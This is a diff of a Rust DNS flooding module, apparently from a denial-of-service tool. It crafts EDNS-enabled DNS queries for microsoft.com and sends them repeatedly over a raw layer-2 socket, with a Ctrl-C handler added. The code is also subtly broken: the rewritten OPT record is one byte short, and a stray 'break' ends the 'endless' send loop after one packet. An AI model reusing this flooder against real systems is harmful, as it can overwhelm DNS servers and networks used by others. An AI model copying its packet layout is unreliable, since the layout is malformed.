@@ -1,10 +1,12 @@
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 use std::net::Ipv4Addr;
 use crate::engines::DnsArgs;
 use crate::iface::IfaceInfo;
 use crate::generators::RandomValues;
 use crate::pkt_builder::PacketBuilder;
 use crate::sockets::Layer2RawSocket;
-use crate::utils::{ inline_display, parse_mac, mac_u8_to_string };
+use crate::utils::{ inline_display, parse_mac, mac_u8_to_string, CtrlCHandler };
 
 
 
@@ -61,6 +63,12 @@ impl DnsFlooder {
 
 
 
+    fn create_a_query() -> Vec<u8> {
+        Self::create_dns_query("microsoft.com", true)
+    }
+
+
+
     fn create_dns_query(domain: &str, use_edns: bool) -> Vec<u8> {
         let header_size   = 12;
         let question_size = Self::compute_question_size(domain);
@@ -70,18 +78,31 @@ impl DnsFlooder {
         let mut payload = vec![0u8; total_size];
         let mut pos     = 0;
         
-        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes()); // ID
+        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
         pos += 2;
-        payload[pos] = 0x01; // Flags: RD = 1
+        
+        payload[pos] = 0x01; 
         pos += 1;
-        payload[pos] = 0x00; // Resto das flags
+        payload[pos] = 0x20; 
         pos += 1;
-        payload[pos] = 0x00; // QDCOUNT alto
+        
+        payload[pos] = 0x00;
         pos += 1;
-        payload[pos] = 0x01; // QDCOUNT baixo = 1
+        payload[pos] = 0x01;
         pos += 1;
-        payload[pos..pos + 6].copy_from_slice(&[0u8; 6]); // AN, NS, AR counts = 0
-        pos += 6;
+        
+        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
+        pos += 2;
+        
+        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
+        pos += 2;
+        
+        if use_edns {
+            payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
+        } else {
+            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
+        }
+        pos += 2;
         
         for part in domain.split('.') {
             payload[pos] = part.len() as u8;
@@ -89,26 +110,33 @@ impl DnsFlooder {
             payload[pos..pos + part.len()].copy_from_slice(part.as_bytes());
             pos += part.len();
         }
-
+        
         payload[pos] = 0;
         pos += 1;
-        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes()); // QTYPE
+        
+        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
         pos += 2;
-        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes()); // QCLASS = IN
+        
+        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
         pos += 2;
         
         if use_edns {
             payload[pos] = 0;
             pos += 1;
-            payload[pos..pos + 2].copy_from_slice(&41u16.to_be_bytes()); // TYPE = OPT
+            
+            payload[pos..pos + 2].copy_from_slice(&41u16.to_be_bytes());
             pos += 2;
-            payload[pos..pos + 2].copy_from_slice(&512u16.to_be_bytes()); // UDPSize
+            
+            payload[pos..pos + 2].copy_from_slice(&512u16.to_be_bytes());
             pos += 2;
-            payload[pos] = 0; // Extended RCODE
+            
+            payload[pos] = 0x00;
             pos += 1;
-            payload[pos] = 0; // EDNS Version
-            pos += 1;
-            payload[pos..pos + 4].copy_from_slice(&0u32.to_be_bytes()); // Z + RDATA length
+            
+            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
+            pos += 2;
+            
+            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
         }
         
         payload
@@ -123,13 +151,7 @@ impl DnsFlooder {
         }
         size + 1 + 2 + 2
     }
-    
 
-
-    fn create_a_query() -> Vec<u8> {
-        Self::create_dns_query("microsoft.com", true)
-    }
-    
 
 
     fn update_dns_id(&mut self) {
@@ -158,18 +180,22 @@ impl DnsFlooder {
 
 
     fn send_endlessly(&mut self) {
-        let socket = Layer2RawSocket::new(&self.iface);
+        let socket  = Layer2RawSocket::new(&self.iface);
+        let running = Arc::new(AtomicBool::new(true));
+        CtrlCHandler::setup(running.clone());
 
-        loop {
+        while running.load(Ordering::SeqCst) {
+            self.update_dns_id();
+            
             let pkt = self.get_pkt();
             socket.send(pkt);
-
-            self.update_dns_id();
 
             self.pkts_sent += 1;
             inline_display(&format!("Packets sent: {}", &self.pkts_sent));
             break;
         }
+
+        println!("\nFlood interrupted");
     }
 
 
